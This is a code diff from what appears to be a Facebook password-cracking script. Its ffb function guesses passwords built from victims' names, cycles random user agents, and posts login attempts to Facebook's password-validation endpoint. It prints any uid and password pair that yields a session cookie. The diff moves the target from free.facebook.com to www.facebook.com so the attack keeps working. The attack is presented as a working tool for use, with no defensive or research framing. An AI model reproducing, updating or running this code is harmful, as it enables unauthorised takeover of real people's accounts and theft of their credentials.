@@ -630,7 +630,7 @@ def ffb(ids,names,passlist):
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
                         head = {                         
-                           'authority': 'free.facebook.com',
+                           'authority': 'www.facebook.com',
                             'upgrade-insecure-requests': '1',
                             'viewport-width': '980',
                             'method': 'path',
@@ -651,9 +651,9 @@ def ffb(ids,names,passlist):
                             'upgrade-insecure-requests': '1',
                             'user-agent': ua,
 }
-                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        getlog = session.get(f'https://www.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://www.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post('https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         RAHUL=str(session.cookies)
                         if "c_user" in RAHUL:
                                 print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
